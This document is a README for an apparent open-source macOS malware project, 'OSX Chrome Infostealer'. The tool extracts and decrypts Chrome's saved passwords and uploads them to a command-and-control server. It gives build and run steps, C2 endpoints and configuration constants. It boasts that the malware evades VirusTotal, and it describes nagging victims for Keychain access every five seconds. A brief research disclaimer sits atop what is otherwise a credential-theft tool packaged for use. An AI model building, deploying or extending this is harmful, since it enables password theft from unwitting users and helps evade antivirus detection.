```bash
 ██████╗ ███████╗██╗  ██╗     ██████╗██╗  ██╗██████╗  ██████╗ ███╗   ███╗███████╗
██╔═══██╗██╔════╝╚██╗██╔╝    ██╔════╝██║  ██║██╔══██╗██╔═══██╗████╗ ████║██╔════╝
██║   ██║███████╗ ╚███╔╝     ██║     ███████║██████╔╝██║   ██║██╔████╔██║█████╗
██║   ██║╚════██║ ██╔██╗     ██║     ██╔══██║██╔══██╗██║   ██║██║╚██╔╝██║██╔══╝
╚██████╔╝███████║██╔╝ ██╗    ╚██████╗██║  ██║██║  ██║╚██████╔╝██║ ╚═╝ ██║███████╗
 ╚═════╝ ╚══════╝╚═╝  ╚═╝     ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝

██╗███╗   ██╗███████╗ ██████╗ ███████╗████████╗███████╗ █████╗ ██╗     ███████╗██████╗
██║████╗  ██║██╔════╝██╔═══██╗██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║     ██╔════╝██╔══██╗
██║██╔██╗ ██║█████╗  ██║   ██║███████╗   ██║   █████╗  ███████║██║     █████╗  ██████╔╝
██║██║╚██╗██║██╔══╝  ██║   ██║╚════██║   ██║   ██╔══╝  ██╔══██║██║     ██╔══╝  ██╔══██╗
██║██║ ╚████║██║     ╚██████╔╝███████║   ██║   ███████╗██║  ██║███████╗███████╗██║  ██║
╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝

- By The Kernel Panic
```

# OSX Chrome Infostealer

OSX Chrome Infostealer is a tool for decrypting and exporting Chrome passwords and sending them securely to a remote Command and Control (C2) Server.

> Disclaimer: This tool is only intended for security research. Users are responsible for all legal and related liabilities resulting from the use of this tool. The original author does not assume any legal responsibility.

## Features

- Extracts encrypted passwords stored in Chrome profiles.
- Decrypts passwords using Chrome's Safe Storage Key.
- Encrypts the decrypted passwords using AES-256-GCM.
- Sends the encrypted data to a specified C2 server.
- Automatically handles errors and retries for failed operations.
- Gracefully terminates running Chrome processes before accessing its files.
- The malware is undetected by VirusTotal. `SHA-256 Hash: 275d13e8dbf5613fb2591d790ed2558d657deca473c08e31566aa5ac2f3667eb`

![Virus Total Scan Result](assets/VT_scan.png "Virus Total Scan Result")

### Server

- Handles incoming encrypted data uploads.
- Decrypts uploaded data using AES-256-GCM.
- Saves decrypted data to a YAML file.
- Logs errors and error reports to a file.
- Provides endpoints for:
  - `/upload`: To handle main data uploads.
  - `/report_error`: To receive and log error reports.

## Requirements

- macOS system with Chrome installed.
- Go 1.18 or later.
- Internet access for communication with the C2 server.

## Installation

1. **Clone the repository:**

   ```bash
   git clone https://github.com/Piyush-Bhor/osx-chrome-infostealer.git
   cd osx-chrome-infostealer
   ```

2. **Install dependencies:**
   Ensure you have Go modules enabled and run:

   ```bash
   go mod tidy
   ```

3. **Build the program:**

- Infostealer

```bash
go build /client/main.go -o main
```

- C2 Server

```bash
go build  /server/server.go -o server
```

## Usage

### Client

1. **Run the program:**

   ```bash
   ./main
   ```

2. The program will:
   - Locate Chrome's `Login Data` SQLite files for each profile.
   - Extract and decrypt passwords stored in the database.
   - Encrypt the extracted data and upload it to the C2 server at the specified URL.
   - If the user denies permission to access Chrome Safe Storage Key, it will keep prompting for a password every 5 seconds.

### Server

1. **Run the server:**
   ```bash
   ./c2-server
   ```
2. The server will start listening on `http://localhost:8080` and provide the following endpoints:
   - `/upload`: Accepts encrypted data uploads from the decryptor.
   - `/report_error`: Accepts error reports and logs them to a file.

## Configuration

- **C2_URL**: The URL of the Command and Control server. Update the constant in the code if required:

  ```go
  const C2_URL = "http://localhost:8080/upload"
  ```

- **AES Key**: The AES encryption key used for secure data transmission to the C2 server. This is defined in the code:

  ```go
  const key = "your-32-byte-key-goes-here"
  ```

- **Retry Interval**: The interval for retrying operations like fetching the Safe Storage Key if permissions are denied:

  ```go
  const retryInterval = 5 * time.Second
  ```

- **Server Port:**
  The server listens on port `8080` by default. Update this in the `main()` function of the server code if necessary:

  ```go
  port := ":8080"
  ```

- **Output Files:**
  - **Decrypted Data:** The server saves decrypted data to `output.yaml`.
  - **Error Logs:** Errors and error reports are logged to `error_log.txt`.

## Security Considerations

- **Permissions**: The program requires access to Chrome's `Login Data` and macOS Keychain. If permissions are denied, the program will retry until granted.
- **Encryption**: All data sent to the C2 server is encrypted using AES-256-GCM for confidentiality.
- **Error Logging**: Any errors encountered during execution are securely reported to the C2 server.

## Dependencies

- `github.com/mattn/go-sqlite3`: SQLite driver for accessing Chrome's `Login Data` files.
- `golang.org/x/crypto/pbkdf2`: PBKDF2 implementation for deriving encryption keys.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
